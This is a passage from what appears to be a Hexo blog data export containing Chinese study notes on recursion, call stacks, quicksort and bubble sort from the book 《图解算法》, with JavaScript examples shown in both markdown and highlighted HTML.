调用栈\n\n* 函数里面调用函数，形成一个栈结构\n* greet 里面调用 greet1 函数，计算机先为第一个函数调用分配一个内存块，再为第二个分配一个内存块（位于第一个上面），然后第二个从函数调用返回，此时栈顶的内存块被弹出，然后剩下第一个\n\n#### 递归调用栈\n\n* 特殊一点的调用栈，就是调用自己的\n* 栈中包含未完成的函数调用，这样栈就帮你跟踪了函数\n* 使用栈虽然方便，但也要付出代价，存储详尽的信息可能占用大量的内存。每个函数调用都要占用一定的内存，如果栈很高，就意味着计算机存储了大量函数调用的信息。\n","source":"_posts/study-Graphical-algorithm03.md","raw":"---\ntitle: 读《图解算法》03-递归和栈\ndate: 2018-05-06 19:07:56\ntags: 图解算法\n---\n\n## 递归\n\n### 概念\n\n* 函数调用自己\n* 需要有基线条件和递归条件\n\n### 基线条件和递归条件\n\n> 每个递归函数都有两部分：基线条件和递归条件。\n\n* 递归条件是指函数调用自己\n* 基线条件是指函数不再调用自己，从而避免无限循环\n\n```javascript\n//倒计时\nfunction countdown(i) {\n  console.log(i);\n  if (i <= 0) {\n    return; //基线条件\n  } else {\n    countdown(i - 1);\n    //递归条件;\n  }\n}\n```\n\n## 栈\n\n### 概念\n\n* 一种类似堆叠的盘子的数据结构\n\n### 调用栈\n\n* 函数里面调用函数，形成一个栈结构\n* greet 里面调用 greet1 函数，计算机先为第一个函数调用分配一个内存块，再为第二个分配一个内存块（位于第一个上面），然后第二个从函数调用返回，此时栈顶的内存块被弹出，然后剩下第一个\n\n#### 递归调用栈\n\n* 特殊一点的调用栈，就是调用自己的\n* 栈中包含未完成的函数调用，这样栈就帮你跟踪了函数\n* 使用栈虽然方便，但也要付出代价，存储详尽的信息可能占用大量的内存。每个函数调用都要占用一定的内存，如果栈很高，就意味着计算机存储了大量函数调用的信息。\n","slug":"study-Graphical-algorithm03","published":1,"updated":"2018-05-06T11:23:27.859Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034ka001c0iof24ar5zkh","content":"<h2 id=\"递归\"><a href=\"#递归\" class=\"headerlink\" title=\"递归\"></a>递归</h2><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><ul>\n<li>函数调用自己</li>\n<li>需要有基线条件和递归条件</li>\n</ul>\n<h3 id=\"基线条件和递归条件\"><a href=\"#基线条件和递归条件\" class=\"headerlink\" title=\"基线条件和递归条件\"></a>基线条件和递归条件</h3><blockquote>\n<p>每个递归函数都有两部分：基线条件和递归条件。</p>\n</blockquote>\n<ul>\n<li>递归条件是指函数调用自己</li>\n<li>基线条件是指函数不再调用自己，从而避免无限循环</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//倒计时</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">countdown</span>(<span class=\"params\">i</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (i &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">//基线条件</span></span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    countdown(i - <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"comment\">//递归条件;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"栈\"><a href=\"#栈\" class=\"headerlink\" title=\"栈\"></a>栈</h2><h3 id=\"概念-1\"><a href=\"#概念-1\" class=\"headerlink\" title=\"概念\"></a>概念</h3><ul>\n<li>一种类似堆叠的盘子的数据结构</li>\n</ul>\n<h3 id=\"调用栈\"><a href=\"#调用栈\" class=\"headerlink\" title=\"调用栈\"></a>调用栈</h3><ul>\n<li>函数里面调用函数，形成一个栈结构</li>\n<li>greet 里面调用 greet1 函数，计算机先为第一个函数调用分配一个内存块，再为第二个分配一个内存块（位于第一个上面），然后第二个从函数调用返回，此时栈顶的内存块被弹出，然后剩下第一个</li>\n</ul>\n<h4 id=\"递归调用栈\"><a href=\"#递归调用栈\" class=\"headerlink\" title=\"递归调用栈\"></a>递归调用栈</h4><ul>\n<li>特殊一点的调用栈，就是调用自己的</li>\n<li>栈中包含未完成的函数调用，这样栈就帮你跟踪了函数</li>\n<li>使用栈虽然方便，但也要付出代价，存储详尽的信息可能占用大量的内存。每个函数调用都要占用一定的内存，如果栈很高，就意味着计算机存储了大量函数调用的信息。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"递归\"><a href=\"#递归\" class=\"headerlink\" title=\"递归\"></a>递归</h2><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><ul>\n<li>函数调用自己</li>\n<li>需要有基线条件和递归条件</li>\n</ul>\n<h3 id=\"基线条件和递归条件\"><a href=\"#基线条件和递归条件\" class=\"headerlink\" title=\"基线条件和递归条件\"></a>基线条件和递归条件</h3><blockquote>\n<p>每个递归函数都有两部分：基线条件和递归条件。</p>\n</blockquote>\n<ul>\n<li>递归条件是指函数调用自己</li>\n<li>基线条件是指函数不再调用自己，从而避免无限循环</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//倒计时</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">countdown</span>(<span class=\"params\">i</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (i &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">//基线条件</span></span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    countdown(i - <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"comment\">//递归条件;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"栈\"><a href=\"#栈\" class=\"headerlink\" title=\"栈\"></a>栈</h2><h3 id=\"概念-1\"><a href=\"#概念-1\" class=\"headerlink\" title=\"概念\"></a>概念</h3><ul>\n<li>一种类似堆叠的盘子的数据结构</li>\n</ul>\n<h3 id=\"调用栈\"><a href=\"#调用栈\" class=\"headerlink\" title=\"调用栈\"></a>调用栈</h3><ul>\n<li>函数里面调用函数，形成一个栈结构</li>\n<li>greet 里面调用 greet1 函数，计算机先为第一个函数调用分配一个内存块，再为第二个分配一个内存块（位于第一个上面），然后第二个从函数调用返回，此时栈顶的内存块被弹出，然后剩下第一个</li>\n</ul>\n<h4 id=\"递归调用栈\"><a href=\"#递归调用栈\" class=\"headerlink\" title=\"递归调用栈\"></a>递归调用栈</h4><ul>\n<li>特殊一点的调用栈，就是调用自己的</li>\n<li>栈中包含未完成的函数调用，这样栈就帮你跟踪了函数</li>\n<li>使用栈虽然方便，但也要付出代价，存储详尽的信息可能占用大量的内存。每个函数调用都要占用一定的内存，如果栈很高，就意味着计算机存储了大量函数调用的信息。</li>\n</ul>\n"},{"title":"读《图解算法》03-快速排序","date":"2018-05-06T11:25:46.000Z","_content":"\n## 分而治之（divide and conquer）\n\n* 缩写就是 D&C\n* 一种著名的递归式问题解决办法\n* 快速排序是一个重要的 D&C 算法\n\n### 步骤\n\n* 找出基线条件，这种条件应该尽可能简单\n* 不断将问题分解（或者说缩小规模），直到符合基线条件\n\n### 场景\n\n> 给定一个数组[2,4,6]，然后相加，并返回结果，不使用循环\n\n* 第一步找到基线条件，最简单的数组是怎样的？如果数组不包含一个元素或者只有一个元素，那么计算总和就容易了，这就是基线条件\n* 每次递归调用都必须离空数组更近\n\n```javascript\nfunction sum(arr) {\n  if (arr.length == 1) {\n    return arr[0];\n  } else {\n    //别忘了递归记录了状态\n    return arr.shift() + sum(arr);\n  }\n}\n```\n\n## 快速排序\n\n> 使用快排对数组进行排序\n\n* 对于排序算法来说，最简单的数组是怎么样的？没错，就是根本不需要排序的一个元素的数组或者空数组\n\n### 原理\n\n> [33,15,10]\n\n* \b 首先在数组中选择一个元素，这个元素被称为基准值（pivot），等等介绍如何选择合适的基准值，这里选择第一个元素 33\n* 找出比基准值小的元素和比他大的元素，这叫分区\n* 现在我有：一个由所有小于基准值的数字组成的子数组，基准值，一个由所有大于基准值的数字组成的子数组\n* 然后再对子数组进行排序，然后合并结果就能得到有序数组：quicksort([15,10])+[33]+quicksort([])\n\n```javascript\nfunction quicksort(arr) {\n  if (arr.length < 2) {\n    //基线条件：为空或者包含一个元素的数组有序\n    return arr;\n  } else {\n    let pivot = arr[0]; //递归条件\n    let less = [],\n      greater = [];\n    //子数组\n    arr.forEach(item => {\n      if (item < pivot) {\n        less.push(item);\n      }\n      if (item > pivot) {\n        greater.push(item);\n      }\n    });\n    return [...quicksort(less), pivot, ...quicksort(greater)];\n  }\n}\n```\n\n### 最糟情况和平均情况\n\n* 平均情况下是 O（n\\*logn）\n\n  > 有一种算法叫合并排序也是这个，但是为什么不用这个呢，是因为大 O 表示法有个常量（也被叫做固定时间量）被省去了，如果两个算法的大 O 运行时间不一样，那么常量无关紧要，参考简单查找和二分查找。如果一样的话，那么常量的影响非常大。两个函数，后面那个我每读一个元素，睡一秒种，但是其实两个函数速度一样，但是前面所需的时间更少。同理可得，快排所需的时间更少，而且相对于遇上最糟情况，它遇上平均情况的可能性大得多。\n\n* 最糟糕就是与选择排序一样慢，O（n^2）\n\n#### 场景\n\n* 比如[1,2,3,4,5,6,7]\n* 如果从第一个数作为基准值，数组没有被切成两半，这将导致调用栈很长，栈长 n 个，而且最上面那层都涉及 n 个元素，然后类推 n-1 个元素，最终得出 n\\*n\\*1/2 个操作，去掉常数，也就是 n^2\n* 如果总是将中间的元素作为基准值，数组分成两半，最佳情况下,栈长为 logn 个,然后每次也是涉及 O（n）个元素（去掉常量），也就是 n\\*logn。而且最佳情况也是平均情况，只要每次随机地选择一个数组元素作为基准值，那么平均运行时间就是 O（nlogn）\n\n```javascript\nfunction quicksort(arr) {\n  if (arr.length < 2) {\n    //基线条件：为空或者包含一个元素的数组有序\n    return arr;\n  } else {\n    //随机选择索引\n    let index = randomNum(0, arr.length - 1);\n    let pivot = arr[index]; //递归条件\n    let less = [],\n      greater = [];\n    //子数组\n    arr.forEach(item => {\n      if (item < pivot) {\n        less.push(item);\n      }\n      if (item > pivot) {\n        greater.push(item);\n      }\n    });\n    return [...quicksort(less), pivot, ...quicksort(greater)];\n  }\n}\n//随机数\nfunction randomNum(minNum, maxNum) {\n  switch (arguments.length) {\n    case 1:\n      return parseInt(Math.random() * minNum + 1, 10);\n      break;\n    case 2:\n      return parseInt(Math.random() * (maxNum - minNum + 1) + minNum, 10);\n      break;\n    default:\n      return 0;\n      break;\n  }\n}\n```\n\n## 说一下冒泡排序\n\n> 想象一下一个个冒泡上来，第一次遍历，第一个跟接下来的比较，如果比他大就换位置，一圈完事后。到第二个，跟接下来的换位置。\n\n* 运行时是 O（n^2）\n\n```javascript\nfunction bubbleSort(arr) {\n  for (let i = 0; i < arr.length; i++) {\n    for (let j = i + 1; j < arr.length; j++) {\n      if (arr[i] > arr[j]) {\n        let temp = arr[i];\n        arr[i] = arr[j];\n        arr[j] = temp;\n      }\n    }\n  }\n  console.log(arr);\n  return arr;\n}\n```\n","source":"_posts/study-Graphical-algorithm04.md","raw":"---\ntitle: 读《图解算法》03-快速排序\ndate: 2018-05-06 19:25:46\ntags: 图解算法\n---\n\n## 分而治之（divide and conquer）\n\n* 缩写就是 D&C\n* 一种著名的递归式问题解决办法\n* 快速排序是一个重要的 D&C 算法\n\n### 步骤\n\n* 找出基线条件，这种条件应该尽可能简单\n* 不断将问题分解（或者说缩小规模），直到符合基线条件\n\n### 场景\n\n> 给定一个数组[2,4,6]，然后相加，并返回结果，不使用循环\n\n* 第一步找到基线条件，最简单的数组是怎样的？如果数组不包含一个元素或者只有一个元素，那么计算总和就容易了，这就是基线条件\n* 每次递归调用都必须离空数组更近\n\n```javascript\nfunction sum(arr) {\n  if (arr.length == 1) {\n    return arr[0];\n  } else {\n    //别忘了递归记录了状态\n    return arr.shift() + sum(arr);\n  }\n}\n```\n\n## 快速排序\n\n> 使用快排对数组进行排序\n\n* 对于排序算法来说，最简单的数组是怎么样的？没错，就是根本不需要排序的一个元素的数组或者空数组\n\n### 原理\n\n> [33,15,10]\n\n* \b 首先在数组中选择一个元素，这个元素被称为基准值（pivot），等等介绍如何选择合适的基准值，这里选择第一个元素 33\n* 找出比基准值小的元素和比他大的元素，这叫分区\n* 现在我有：一个由所有小于基准值的数字组成的子数组，基准值，一个由所有大于基准值的数字组成的子数组\n* 然后再对子数组进行排序，然后合并结果就能得到有序数组：quicksort([15,10])+[33]+quicksort([])\n\n```javascript\nfunction quicksort(arr) {\n  if (arr.length < 2) {\n    //基线条件：为空或者包含一个元素的数组有序\n    return arr;\n  } else {\n    let pivot = arr[0]; //递归条件\n    let less = [],\n      greater = [];\n    //子数组\n    arr.forEach(item => {\n      if (item < pivot) {\n        less.push(item);\n      }\n      if (item > pivot) {\n        greater.push(item);\n      }\n    });\n    return [...quicksort(less), pivot, ...quicksort(greater)];\n  }\n}\n```\n\n### 最糟情况和平均情况\n\n* 平均情况下是 O（n\\*logn）\n\n  > 有一种算法叫合并排序也是这个，但是为什么不用这个呢，是因为大 O 表示法有个常量（也被叫做固定时间量）被省去了，如果两个算法的大 O 运行时间不一样，那么常量无关紧要，参考简单查找和二分查找。如果一样的话，那么常量的影响非常大。两个函数，后面那个我每读一个元素，睡一秒种，但是其实两个函数速度一样，但是前面所需的时间更少。同理可得，快排所需的时间更少，而且相对于遇上最糟情况，它遇上平均情况的可能性大得多。\n\n* 最糟糕就是与选择排序一样慢，O（n^2）\n\n#### 场景\n\n* 比如[1,2,3,4,5,6,7]\n* 如果从第一个数作为基准值，数组没有被切成两半，这将导致调用栈很长，栈长 n 个，而且最上面那层都涉及 n 个元素，然后类推 n-1 个元素，最终得出 n\\*n\\*1/2 个操作，去掉常数，也就是 n^2\n* 如果总是将中间的元素作为基准值，数组分成两半，最佳情况下,栈长为 logn 个,然后每次也是涉及 O（n）个元素（去掉常量），也就是 n\\*logn。而且最佳情况也是平均情况，只要每次随机地选择一个数组元素作为基准值，那么平均运行时间就是 O（nlogn）\n\n```javascript\nfunction quicksort(arr) {\n  if (arr.length < 2) {\n    //基线条件：为空或者包含一个元素的数组有序\n    return arr;\n  } else {\n    //随机选择索引\n    let index = randomNum(0, arr.length - 1);\n    let pivot = arr[index]; //递归条件\n    let less = [],\n      greater = [];\n    //子数组\n    arr.forEach(item => {\n      if (item < pivot) {\n        less.push(item);\n      }\n      if (item > pivot) {\n        greater.push(item);\n      }\n    });\n    return [...quicksort(less), pivot, ...quicksort(greater)];\n  }\n}\n//随机数\nfunction randomNum(minNum, maxNum) {\n  switch (arguments.length) {\n    case 1:\n      return parseInt(Math.random() * minNum + 1, 10);\n      break;\n    case 2:\n      return parseInt(Math.random() * (maxNum - minNum + 1) + minNum, 10);\n      break;\n    default:\n      return 0;\n      break;\n  }\n}\n```\n\n## 说一下冒泡排序\n\n> 想象一下一个个冒泡上来，第一次遍历，第一个跟接下来的比较，如果比他大就换位置，一圈完事后。到第二个，跟接下来的换位置。\n\n* 运行时是 O（n^2）\n\n```javascript\nfunction bubbleSort(arr) {\n  for (let i = 0; i < arr.length; i++) {\n    for (let j = i + 1; j < arr.length; j++) {\n      if (arr[i] > arr[j]) {\n        let temp = arr[i];\n        arr[i] = arr[j];\n        arr[j] = temp;\n      }\n    }\n  }\n  console.log(arr);\n  return arr;\n}\n```\n","slug":"study-Graphical-algorithm04","published":1,"updated":"2018-05-07T06:12:31.834Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034kd001e0iofvhpnlibb","content":"<h2 id=\"分而治之（divide-and-conquer）\"><a href=\"#分而治之（divide-and-conquer）\" class=\"headerlink\" title=\"分而治之（divide and conquer）\"></a>分而治之（divide and conquer）</h2><ul>\n<li>缩写就是 D&amp;C</li>\n<li>一种著名的递归式问题解决办法</li>\n<li>快速排序是一个重要的 D&amp;C 算法</li>\n</ul>\n<h3 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h3><ul>\n<li>找出基线条件，这种条件应该尽可能简单</li>\n<li>不断将问题分解（或者说缩小规模），直到符合基线条件</li>\n</ul>\n<h3 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h3><blockquote>\n<p>给定一个数组[2,4,6]，然后相加，并返回结果，不使用循环</p>\n</blockquote>\n<ul>\n<li>第一步找到基线条件，最简单的数组是怎样的？如果数组不包含一个元素或者只有一个元素，那么计算总和就容易了，这就是基线条件</li>\n<li>每次递归调用都必须离空数组更近</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sum</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (arr.length == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr[<span class=\"number\">0</span>];</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//别忘了递归记录了状态</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr.shift() + sum(arr);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"快速排序\"><a href=\"#快速排序\" class=\"headerlink\" title=\"快速排序\"></a>快速排序</h2><blockquote>\n<p>使用快排对数组进行排序</p>\n</blockquote>\n<ul>\n<li>对于排序算法来说，最简单的数组是怎么样的？没错，就是根本不需要排序的一个元素的数组或者空数组</li>\n</ul>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><blockquote>\n<p>[33,15,10]</p>\n</blockquote>\n<ul>\n<li>\b 首先在数组中选择一个元素，这个元素被称为基准值（pivot），等等介绍如何选择合适的基准值，这里选择第一个元素 33</li>\n<li>找出比基准值小的元素和比他大的元素，这叫分区</li>\n<li>现在我有：一个由所有小于基准值的数字组成的子数组，基准值，一个由所有大于基准值的数字组成的子数组</li>\n<li>然后再对子数组进行排序，然后合并结果就能得到有序数组：quicksort([15,10])+[33]+quicksort([])</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">quicksort</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (arr.length &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//基线条件：为空或者包含一个元素的数组有序</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> pivot = arr[<span class=\"number\">0</span>]; <span class=\"comment\">//递归条件</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> less = [],</span><br><span class=\"line\">      greater = [];</span><br><span class=\"line\">    <span class=\"comment\">//子数组</span></span><br><span class=\"line\">    arr.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (item &lt; pivot) &#123;</span><br><span class=\"line\">        less.push(item);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (item &gt; pivot) &#123;</span><br><span class=\"line\">        greater.push(item);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [...quicksort(less), pivot, ...quicksort(greater)];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"最糟情况和平均情况\"><a href=\"#最糟情况和平均情况\" class=\"headerlink\" title=\"最糟情况和平均情况\"></a>最糟情况和平均情况</h3><ul>\n<li><p>平均情况下是 O（n*logn）</p>\n<blockquote>\n<p>有一种算法叫合并排序也是这个，但是为什么不用这个呢，是因为大 O 表示法有个常量（也被叫做固定时间量）被省去了，如果两个算法的大 O 运行时间不一样，那么常量无关紧要，参考简单查找和二分查找。如果一样的话，那么常量的影响非常大。两个函数，后面那个我每读一个元素，睡一秒种，但是其实两个函数速度一样，但是前面所需的时间更少。同理可得，快排所需的时间更少，而且相对于遇上最糟情况，它遇上平均情况的可能性大得多。</p>\n</blockquote>\n</li>\n<li><p>最糟糕就是与选择排序一样慢，O（n^2）</p>\n</li>\n</ul>\n<h4 id=\"场景-1\"><a href=\"#场景-1\" class=\"headerlink\" title=\"场景\"></a>场景</h4><ul>\n<li>比如[1,2,3,4,5,6,7]</li>\n<li>如果从第一个数作为基准值，数组没有被切成两半，这将导致调用栈很长，栈长 n 个，而且最上面那层都涉及 n 个元素，然后类推 n-1 个元素，最终得出 n*n*1/2 个操作，去掉常数，也就是 n^2</li>\n<li>如果总是将中间的元素作为基准值，数组分成两半，最佳情况下,栈长为 logn 个,然后每次也是涉及 O（n）个元素（去掉常量），也就是 n*logn。而且最佳情况也是平均情况，只要每次随机地选择一个数组元素作为基准值，那么平均运行时间就是 O（nlogn）</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">quicksort</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (arr.length &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//基线条件：为空或者包含一个元素的数组有序</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//随机选择索引</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> index = randomNum(<span class=\"number\">0</span>, arr.length - <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> pivot = arr[index]; <span class=\"comment\">//递归条件</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> less = [],</span><br><span class=\"line\">      greater = [];</span><br><span class=\"line\">    <span class=\"comment\">//子数组</span></span><br><span class=\"line\">    arr.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (item &lt; pivot) &#123;</span><br><span class=\"line\">        less.push(item);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (item &gt; pivot) &#123;</span><br><span class=\"line\">        greater.push(item);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [...quicksort(less), pivot, ...quicksort(greater)];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//随机数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">randomNum</span>(<span class=\"params\">minNum, maxNum</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> (<span class=\"built_in\">arguments</span>.length) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">parseInt</span>(<span class=\"built_in\">Math</span>.random() * minNum + <span class=\"number\">1</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">parseInt</span>(<span class=\"built_in\">Math</span>.random() * (maxNum - minNum + <span class=\"number\">1</span>) + minNum, <span class=\"number\">10</span>);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"说一下冒泡排序\"><a href=\"#说一下冒泡排序\" class=\"headerlink\" title=\"说一下冒泡排序\"></a>说一下冒泡排序</h2><blockquote>\n<p>想象一下一个个冒泡上来，第一次遍历，第一个跟接下来的比较，如果比他大就换位置，一圈完事后。到第二个，跟接下来的换位置。</p>\n</blockquote>\n<ul>\n<li>运行时是 O（n^2）</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bubbleSort</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = i + <span class=\"number\">1</span>; j &lt; arr.length; j++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (arr[i] &gt; arr[j]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> temp = arr[i];</span><br><span class=\"line\">        arr[i] = arr[j];</span><br><span class=\"line\">        arr[j] = temp;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> arr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"分而治之（divide-and-conquer）\"><a href=\"#分而治之（divide-and-conquer）\" class=\"headerlink\" title=\"分而治之（divide and conquer）\"></a>分而治之（divide and conquer）</h2><ul>\n<li>缩写就是 D&amp;C</li>\n<li>一种著名的递归式问题解决办法</li>\n<li>快速排序是一个重要的 D&amp;C 算法</li>\n</ul>\n<h3 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h3><ul>\n<li>找出基线条件，这种条件应该尽可能简单</li>\n<li>不断将问题分解（或者说缩小规模），直到符合基线条件</li>\n</ul>\n<h3 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" 